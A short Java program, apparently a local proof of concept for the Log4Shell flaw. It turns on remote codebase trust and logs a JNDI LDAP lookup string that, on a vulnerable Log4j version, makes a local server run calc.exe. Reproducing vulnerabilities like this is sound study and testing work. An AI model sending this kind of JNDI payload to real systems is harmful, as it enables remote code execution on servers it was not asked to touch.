import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    private static final Logger log = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.object.trustURLCodebase", "true");

        log.error("Hello {}", "${jndi:ldap://localhost:8080/Basic/Command/calc.exe}");
    }
}
